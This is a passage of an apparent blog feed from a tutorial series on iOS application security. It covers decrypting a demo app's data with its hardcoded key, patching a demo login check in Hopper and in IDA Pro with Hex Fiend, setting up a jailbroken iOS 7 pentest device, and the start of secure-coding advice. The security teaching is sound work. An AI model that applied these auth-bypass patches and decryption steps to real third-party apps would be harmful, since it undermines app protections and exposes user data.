&lt;p&gt;Well, it is pretty much clear that we can find the password by decrypting the data from the file &lt;em&gt;secret-data&lt;/em&gt; and converting it into a string with the encoding NSUTF8StringEncoding. Let’s write a simple iOS Application to decrypt the data. For this, you will need to copy the file &lt;em&gt;secret-data&lt;/em&gt; from the application sandbox and paste it into the documents folder of the application’s sandbox of this new application. You can also download the complete code from &lt;a href=&quot;https://github.com/prateek147/InsecureCryptographyDecryptor&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;We add this method in the new project.&lt;/p&gt;

&lt;pre&gt;NSString *dataPath = [[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0] stringByAppendingPathComponent:@&quot;/secret-data&quot;];
      NSError *error;
      NSData *encryptedData = [NSData dataWithContentsOfFile:dataPath];
      NSData *decryptedData = [RNDecryptor decryptData:encryptedData
                                        withPassword:@&quot;Secret-Key&quot;
                                               error:&amp;amp;error];
     NSString *password = [[NSString alloc] initWithData:decryptedData
                                               encoding:NSUTF8StringEncoding];

    UILabel *newLabel = [[UILabel alloc] initWithFrame:CGRectMake(140.0, 160.0, 100.0, 100.0)];
    [self.view addSubview:newLabel];
    [newLabel setText:password];
&lt;/pre&gt;

&lt;p&gt;As you can clearly note, this method decrypts the data using the hardcoded password, and shows the value in a label that is displayed on the view.&lt;/p&gt;

&lt;p&gt;After running this application, we can easily see the decrypted password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios29/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article, we looked at how one can exploit a weakness in the encryption being used to find sensitive information from an application. In this case, the weakness was using a hardcoded key. It is essential for developers to make sure that they enforce proper encryption in their applications to prevent them from being compromised.&lt;/p&gt;

&lt;p&gt;In the next article, we will look at Client Side Injection in iOS Applications.&lt;/p&gt;

&lt;p&gt;*&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 28 - Patching iOS Application with Hopper</title>
   <link href="https://bitbrain.github.io/2014/01/17/ios-application-security-part-28-patching-ios-application-with-hopper.html"/>
   <updated>2014-01-17T21:41:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/01/17/ios-application-security-part-28-patching-ios-application-with-hopper</id>
   <content type="html">&lt;p&gt;In &lt;a href=&quot;http://highaltitudehacks.com/2013/12/17/ios-application-security-part-26-patching-ios-applications-using-ida-pro-and-hex-fiend&quot;&gt;Part 26&lt;/a&gt; of this series, we looked at how we can use IDA Pro and Hex Fiend to patch an iOS application and modify its implementation. Patching an application has the specific advantage that once a change has been made, it is permanent. However, if you look back at the article on &lt;a href=&quot;http://highaltitudehacks.com/2013/12/17/ios-application-security-part-26-patching-ios-applications-using-ida-pro-and-hex-fiend&quot;&gt;IDA Pro&lt;/a&gt;, you will realize that the process of patching the application was a bit tedious, mainly because we didn’t have a licensed version of IDA Pro which costs a lot. In this article, we will look at a utility named Hopper which we can use as an alternative to IDA Pro. It is less costly than IDA Pro and also provides a sleek interface to work with.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;According to Hopperapp.com ..&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Hopper is a reverse engineering tool for OS X, Linux and Windows, that lets you disassemble, decompile and debug (OS X only) your 32/64bits Intel Mac, Windows and iOS (ARM) executables! Take a look at the feature list below!&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;And…&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Even if Hopper can disassemble any kind of Intel executable, it does not forget its main platform. Hopper is specialized in retrieving Objective-C information in the files you analyze, like selectors, strings and messages sent.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;In this article, i am using a paid version of Hopper which cost about $60. I think it is an incredible price given the things we can do with this application. I would recommend you check out the demo version which lets you perform some tasks to get a feel of Hopper. Anyways, once you download the Hopper app, this is the interface we are looking at.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this article also, we will use the same demo application that we used in &lt;a href=&quot;http://highaltitudehacks.com/2013/12/17/ios-application-security-part-26-patching-ios-applications-using-ida-pro-and-hex-fiend&quot;&gt;Part 26&lt;/a&gt;, the &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; application that you can download from my github profile. I highly recommend that you read Part 26 before you proceeed with this article. Just to quickly recap, the GDB-Demo had a login form like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It accepts a certain username/password combination in order to allow us to login. Our task is to patch this application in such a way that the application allows us to login even if the username/password combination is not correct. Please note that in this article, we will be debugging and patching the application which is x86 architecture on a laptop , however you can do the same patching with ARM executable as well by copying the binary from the device.&lt;/p&gt;

&lt;p&gt;Once you have downloaded the &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; application, run it using Xcode. This will install the application in the iOS simulator. Now our task is to find the location of the application binary on our system. If you run an application in Xcode, it will generate an application directory inside the folder &lt;em&gt;/Users/$username/Library/Application Support/iPhone Simulator/$ios version of simulator/Applications/&lt;/em&gt;. In my case, the location is &lt;em&gt;/Users/Prateek/Library/Application Support/iPhone Simulator 6.1/Applications/&lt;/em&gt;. Once you are in this directory, you have to find your application folder. Using the command &lt;em&gt;ls -al&lt;/em&gt; will give you the created date of these folders. The latest one would be our application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;open DirectoryName&lt;/em&gt; and this will open the directory in Finder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go inside the folder GDB-Demo.app (this is the application bundle) by right clicking on it and choosing the option &lt;em&gt;Show Package contents&lt;/em&gt;. Inside this folder, you will find the application binary with the name GDB-Demo. This is the binary that we will provide to Hopper.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now open Hopper app and go to File-&amp;gt;Read Executable To Disassemble. Give the location of the GDB-Demo binary. Also make sure to quit Xcode but keep the simulator open.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hopper will now start dissasembling the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On the left hand side, if you select the &lt;em&gt;Strings&lt;/em&gt; section, you will see all the constant strings that Hopper was able to dump from the binary. If you have read part 26 on this series, you will note that the password is also present in this list ;-).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you select the labels section on the left, it will give you all the labels it was able to dump from the application. This includes labels to method implementations, constant strings, classes etc..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We know that the method that is important is loginButtonTapped. So lets search for it in the labels section. Once we find the method, tap on it and it will take you to its disassembly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One kickass feature of Hopper is that it can provide Pseudo code for a function. To check out the Pseudo code for this function, click on Pseudo Code on the top right.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, Hopper provides you with a Pseudo code for this function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is such an amazing feature. It helps us so much in figuring out what this method is supposed to do. In this case, it just gives away the password. Another awesome feature of this application is Show CFG which helps you find the flow of the application. Just click on &lt;em&gt;Show CFG&lt;/em&gt; next to the Pseudo code button.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we scroll down a bit in this function, we get to the point shown in the image below. We can see that the left flow takes us to a point where we see the text &lt;em&gt;Incorrect Username or Password&lt;/em&gt;, whereas the right flow has some text &lt;em&gt;admin page&lt;/em&gt;. Obviously, i would like the flow to go to the right side.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets check the condition that decides which way the flow goes. As we can see from the image below, the assembly instruction is &lt;em&gt;jne 0xcbc&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;0x2cbc is a label that corresponds to the right hand side. So if we can modify the instruction in such a way that the flow is always taken towards the right hand side, then our task will be accomplished.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, its pretty simple to do this. Just replace &lt;em&gt;jne 0xcbc&lt;/em&gt; by &lt;em&gt;jmp 0xcbc&lt;/em&gt;. To do this, click on this specific instruction in the dissassembly and click on Modify-&amp;gt;Assemble instruction&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we write down the instruction that we want and click on Assemble and Go Next. That’s it, this is the only change we want to do.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets save this executable and overwrite the previous one. Go to File -&amp;gt; Produce New Executable and overwrite the original executable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now go the simulator application, quit any running instance of GDB-Demo application and restart the application. Tap on Login and you will see that the login has been bypassed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios28/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Congratulations, we just patched an application using Hopper. This was just a small feature of Hopper. Hopper lets us do many more things. I would recommend you check them out and no, i am not associated with Hopper nor do i know the author personally. I just think its a cool app and for $60, its an extremely good deal !&lt;/p&gt;

&lt;p&gt;In the next article, we will learn about Insecure or Broken Cryptography.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 27 - Setting up a mobile pentesting environment with iOS 7 Jailbreak</title>
   <link href="https://bitbrain.github.io/2014/01/17/ios-application-security-part-27-setting-up-a-mobile-pentesting-environment-with-ios-7-jailbreak.html"/>
   <updated>2014-01-17T21:35:00+00:00</updated>
   <id>https://bitbrain.github.io/2014/01/17/ios-application-security-part-27-setting-up-a-mobile-pentesting-environment-with-ios-7-jailbreak</id>
   <content type="html">&lt;p&gt;In this article we will look at how we can set up a mobile pentesting platform on our device with the new iOS 7 jailbreak. There has been quite a lot of discussion on the web about whether it is safe for a user to jailbreak their devices yet. However, if you are really interested in iOS pentesting then there is no absolutely no reason now why you shouldn’t jailbreak your device. Since this jailbreak was launched by the evasi0n team without any prior notice to the developers, most of the tweaks didn’t work with iOS 7 when the jailbreak was first made public. One of the most critical pieces of software Mobile Substrate which is used in many tweaks initially didn’t work on iOS 7. However, things have settled down since then. An update for Mobile Substrate (named Cydia Substrate) was released a few weeks back and many tweaks were also updated for iOS 7. Some things however don’t work well on iOS 7 devices. In this article, we will look at all those things which we need to do to set up a proper pentesting platform on a device running iOS 7.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;how-to-jailbreak&quot;&gt;How to Jailbreak&lt;/h3&gt;

&lt;p&gt;You can jailbreak your device by downloading the evasi0n software from evasi0n.com . The current jailbreak supports devices upto the latest iOS version, which is 7.0.4. Once it is downloaded on your computer, just connect your device to your computer through USB, open evasi0n and click on Jailbreak to start the jailbreak process. In my case, the device is already jailbroken so i don’t need to jailbreak it again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Follow the instructions given by the software. Once the jailbreak is finished, you will see a new application named Cydia installed on your device. The very first thing you need to do is to install new version of Mobile Substrate for iOS 7 (called the Cydia Substrate) and Substrate safe mode. Mobile Substrate is a very important piece of software as most of the tweaks depend on it to function properly. Substrate safe mode allows a device to reboot in a safe mode without any of the tweaks for a situation where tweaks may cause problems for your device and the device starts disfunctioning.&lt;/p&gt;

&lt;p&gt;Searching for Cydia will give you &lt;em&gt;Cydia Substrate&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/2.PNG&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And searching for Substrate will give you &lt;em&gt;Substrate Safe Mode&lt;/em&gt;. Install both of these by tapping on them and then tapping on Install.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/3.PNG&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is installed, the next thing you need to do is to install OpenSSH on your device. This will help you connect to your device using ssh. Just searching for OpenSSH will give you the desired result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/4.PNG&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tap on it and then tap on Install. This will install OpenSSH on your device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/5.PNG&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now the next thing to do is to change your SSH password. You can find the IP of your device by going to the Settings app, selecting Wifi, and then tapping on the info button on the network you are connected to. By default, the password for both &lt;em&gt;mobile&lt;/em&gt; and &lt;em&gt;root&lt;/em&gt; user is &lt;em&gt;alpine&lt;/em&gt;. We must change this password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, install the Big boss recommended tools package from Cydia. It contains most of the essential tools that you need to work in a jailbroken environment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/7.PNG&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now you need to install some other essential tools. Let’s start with clutch. Clutch can be used to decrypt the applications that are downloaded from the App Store. You can download clutch from &lt;a href=&quot;http://dl.dropboxusercontent.com/u/34557464/clutch&quot;&gt;this&lt;/a&gt; url. Then move it to /usr/bin and make sure to give it executable permissions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Note - If you ever get an error like this while running a command that requires root privileges…&lt;/p&gt;

&lt;p&gt;&lt;em&gt;E: Could not get lock /var/lib/dpkg/lock - open (35: Resource temporarily unavailable) E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This means that the Cydia app is running on your device and is in foreground. Cydia runs with root privileges and hence if you try to run another process with root privileges, it is not able to get a lock on it. Press the home button on your device to take the Cydia app to background. Now you can run the terminal command that requires root privileges.&lt;/p&gt;

&lt;p&gt;Another imporant tool is class-dump-z. As of today (Jan 10, 2014), the original class-dump-z doesn’t work with iOS 7 devices. However, you can see the class information using the old tool class-dump.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios27/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As far as cycript is concerned, it also gives a Segmentation fault when run against iOS 7 devices. However, if you install an older version, i.e 0.9.458 or previous, it does seem to work but with limited functionality.So assuming there was some issue with Mobile Substrate not working properly, i jailbreaked my device again. After this, i was able to successfully run cycript properly with complete functionality.&lt;/p&gt;

&lt;p&gt;You can download Cycript from &lt;a href=&quot;http://cycript.org/debs/&quot;&gt;here&lt;/a&gt; and then use the &lt;em&gt;dpkg -i packageName&lt;/em&gt; command to install Cycript.&lt;/p&gt;

&lt;p&gt;You might also want to install gdb on your device. A proper version of GDB can be found &lt;a href=&quot;https://dl.dropboxusercontent.com/u/34557464/gdb&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So these are all the things that you need to setup a Mobile Pentesting platform on iOS 7. If you have any suggestions, please add it in the comments and i will include it in the article. In the next article, we will learn about Application Patching using a pretty awesome tool called Hopper.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 26 – Patching iOS Applications using IDA Pro and Hex Fiend</title>
   <link href="https://bitbrain.github.io/2013/12/17/ios-application-security-part-26-patching-ios-applications-using-ida-pro-and-hex-fiend.html"/>
   <updated>2013-12-17T13:08:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/12/17/ios-application-security-part-26-patching-ios-applications-using-ida-pro-and-hex-fiend</id>
   <content type="html">&lt;p&gt;In the &lt;a href=&quot;http://highaltitudehacks.com/security&quot;&gt;previous&lt;/a&gt; applications we have looked at how we can hijack method implementations during runtime using Cycript, and even change the logic of the code rather than changing the complete implementation using GDB. All of these things have been done to serve a purpose, which is to make the application do what we want. However, using Cycript or GDB is a bit of a pain as one has to do repeat the same process everytime after you restart the application. This is where patching the application is useful. Once a change has been made in the application’s binary, its permanent. So you don’t have to repeat the same process over and over again. Once the binary is patched, you can then run it on a jailbroken device with the changed logic.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In this article, we will be using the same application &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; that we had used in &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-22-runtime-analysis-manipulation-using-gdb/&quot;&gt;Part 22&lt;/a&gt; of this series. If you remember, we had found a way to change the logic of the method that gets called when Login was tapped and hence bypassed the login authentication check. In this article, we are going to permanently patch this check so we are always authenticated.&lt;/p&gt;

&lt;p&gt;The first thing you need to do is install the demo version of IDA Pro from their &lt;a href=&quot;https://hex-rays.com/products/ida/index.shtml&quot;&gt;website&lt;/a&gt;. IDA Pro is a pretty awesome multi-processor disassembler and debugger. Once it is downloaded, open it up and choose the option &lt;em&gt;Go&lt;/em&gt; which just opens up IDA without any preselected binary. Please note that when you run an application on the simulator using Xcode, the code is compiled for the i386 architecture, whereas when you run the application on a device using Xcode, it is compiled for the ARM architecture. The demo version of IDA Pro supports both these architectures, however in this tutorial we are going to compile the application on i386 architecture (i.e on a simulator) to save the effort of copying the application binary from the device to our computer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now open Xcode and run the &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; application that you had just downloaded using simulator. ake sure the application builds successfully and that it installs propery on the simulator. This will generate an application directory inside the folder &lt;em&gt;/Users/$username/Library/Application Support/iPhone Simulator/$ios version of simulator/Applications/&lt;/em&gt;. In my case, the location is &lt;em&gt;/Users/Prateek/Library/Application Support/iPhone Simulator 6.1/Applications/&lt;/em&gt;. Once you are in this directory, you have to find your application folder. Using the command &lt;em&gt;ls -al&lt;/em&gt; will give you the last modified date of these folders. The latest one would be our application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use the command &lt;em&gt;open DirectoryName&lt;/em&gt; and this will open the directory in Finder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go inside the folder GDB-Demo.app (this is the application bundle) by right clicking on it and choosing the option &lt;em&gt;Show Package contents&lt;/em&gt;. Inside this folder, you will find the application binary with the name GDB-Demo. This is the binary that we will provide to IDA Pro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now drag and drop the application binary on the IDA pro icon. Click on Ok and proceed.&lt;/p&gt;

&lt;p&gt;You will see the disassembled code like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Coming back to the application, we know that the application has a login page like the one shown below. We had already modified the logic of this application using GDB in &lt;a href=&quot;http://resources.infosecinstitute.com/ios-application-security-part-22-runtime-analysis-manipulation-using-gdb/&quot;&gt;Part 22&lt;/a&gt;. We also know that the method whose logic was changed was &lt;em&gt;-(IBAction)loginButtonTapped:(id)sender&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In IDA Pro, you can see a functions window on the left. Choose any function from the list of functions and press &lt;em&gt;Ctrl+F&lt;/em&gt;. Now search for the function loginButtonTapped. Once you have found it, double click on it. You will be shown the dissassembly for this function on the right side.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To view this in sort of a graphical format, double click on the function name in the functions window and press &lt;em&gt;Space&lt;/em&gt;. The view will change to something like this. This is a better way of examining the disassembly as it also helps us in understanding the flow of the function. If you want to switch to the previous view, you can press &lt;em&gt;Space&lt;/em&gt; again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Scroll down in the function disassembly on the right side. You can see that the flow of the function can lead to different blocks of code depending on specific conditions. It is obvious that somewhere within this function there is a check for whether the username and password are correct or not and authenticate or disallow the user. After scrolling down for a bit, we arrive at this block. This looks very interesting. On the right side, i can see &lt;em&gt;UIAlertView&lt;/em&gt; in the code section whereas the left section shows a string named &lt;em&gt;adminPage&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I would really like the flow to go to the left hand side, where it says &lt;em&gt;adminPage&lt;/em&gt;. The instruction that decides which block of code the execution will jump to is just one instruction before.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It says &lt;em&gt;jnz loc_2CBC&lt;/em&gt;, where &lt;em&gt;loc_2CBC&lt;/em&gt; is a label and jnz stands for &lt;em&gt;Jump if not zero&lt;/em&gt; instruction. We can see that the code block on the left contains this label.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means execution will jump to left if the zero flag is not set. If i can modify the instruction &lt;em&gt;jnz&lt;/em&gt; to &lt;em&gt;jz&lt;/em&gt;, then my purpose would be solved as the logic would be reversed and i will be authenticated. So what do i need to convert this from jnz to jz.&lt;/p&gt;

&lt;p&gt;MORE MONEY !&lt;/p&gt;

&lt;p&gt;Well, that was a bit of humour. A licensed version of IDA Pro will get the job done for you and you can simply modify this instruction. However, we are going to do this the free way, even though it requires a bit of extra effort and calculation but its worth it and we will also learn a few new things on the way. In the next article, we will also discuss an alternative named Hopper that is not as expensive as IDA but very good in terms of functionality. For that first we need to find the address of the &lt;em&gt;jnz&lt;/em&gt; instruction. To do that, double click on this instruction so that it gets yellow…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now press Space..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can clearly see, the address of this instruction is &lt;em&gt;00002CB1&lt;/em&gt;. However, we cannot just go ahead and change the address at this instruction, This is because this address is the absolute address of this instruction and it will be different every time the application is launched. What we need to find out is the offset of this instruction relative to the Mach-O binary. This instruction has to be modified in the code section of the assembly. Hence the offset of this instruction relative to the binary can be calculated as ..&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(Offset of code section relative to binary) + (Absolute address of the instruction to be changed - Starting address of the code section)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Right now we just know the Absolute address of the instruction to be changed. We can find the other two things using otool. Browse to the application directory &lt;em&gt;/Users/Prateek/Library/Application Support/iPhone Simulator/6.1/Applications/1804F89F-AD44-4782-BB29-47F5C521D10D/GDB-Demo.app&lt;/em&gt; and use the following command as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Look for the text section.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the starting address is 0x000026f0(Hex) and the offset is 5872(Decimal). Please note that these things may be different in your case.&lt;/p&gt;

&lt;p&gt;Hence, using these values and the above equation we can find the offset as ..&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;5872(Decimal) + (0x00002CB1(Hex)- 0x000026f0(Hex)) = 0x1cb1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now, as we discussed earlier, we need to replace the jnz instruction with a jz instruction. You can see from &lt;a href=&quot;http://www.unixwiz.net/techtips/x86-jumps.html&quot;&gt;this&lt;/a&gt; link that the opcode for the JNZ instruction is &lt;em&gt;OF 85&lt;/em&gt; whereas the opcode for the JZ instruction is &lt;em&gt;OF 84&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Now download the application &lt;em&gt;Hex Fiend&lt;/em&gt; and open it up. Drag and drop the application binary to it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now click on Edit –&amp;gt; Jump to Offset and type the offset as 0x1cb1. This will take you to the line with the jnz instruction.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now look for the opcode OF 85. Change it to 0F 84 as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now save your changes and exit Hexfiend. As you remember, we had installed the app previously in the simulator. So fire up the iOS simulator, quit the GDB-Demo app if it is running and open it again. Now just tap on Login without entering anything in the username and password. It will direct you to the admin page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios26/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfect, we just patched a binary using old school techniques. In the next article, we will look at a tool named Hopper and learn how to patch iOS applications using it.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 25 – Secure Coding Practices for iOS Development</title>
   <link href="https://bitbrain.github.io/2013/12/17/ios-application-security-part-25-secure-coding-practices-for-ios-development.html"/>
   <updated>2013-12-17T13:07:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/12/17/ios-application-security-part-25-secure-coding-practices-for-ios-development</id>
   <content type="html">&lt;p&gt;In this article, we will look at some of the best practices an iOS developer should follow in order to make sure that their application is not easily exploitable by hackers.&lt;/p&gt;

&lt;h3 id=&quot;local-data-storage&quot;&gt;Local Data Storage&lt;/h3&gt;

&lt;p&gt;It is extremely important for developers to know what kind of data they should be storing locally in their application. Frankly speaking, no data is secure when stored locally in the application. In &lt;a href=&quot;http://highaltitudehacks.com/2013/10/26/ios-application-security-part-20-local-data-storage-nsuserdefaults&quot;&gt;part 20&lt;/a&gt; of this series, we have looked at Local Data Storage in great detail.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;ul&gt;
  &lt;li&gt;Important data like Passwords, Session ID’s etc should never be stored locally on the device. If there is no other option, it should be stored on the keychain. This is because you can be assured that the hacker won’t be able to find out the data in your keychain as long as the user’s device is not jailbroken. Since more than 70% people have upgraded their iOS devices to iOS 7 and since there is no public jailbreak for iOS 7 yet, you can be assured that the hacker won’t be able to get the information stored in your keychain (yet). Some people might say that the process of storing data in the keychain isn’t as simple as saving data in NSUserDefaults. But we can always use third-party wrappers that can make the job extremely simple for us. For e.g, &lt;a href=&quot;http://highaltitudehacks.com/2013/09/17/ios-dev-storing-info-in-keychain-with-nsuserdefaults-like-syntax/&quot;&gt;here&lt;/a&gt; is an article that demonstrates the use of a wrapper named PDKeychainBindings and show how simple it is to save data in the keychain. Here is a snippet of code for saving data in the keychain using this wrapper.&lt;/li&gt;
&lt;/ul&gt;

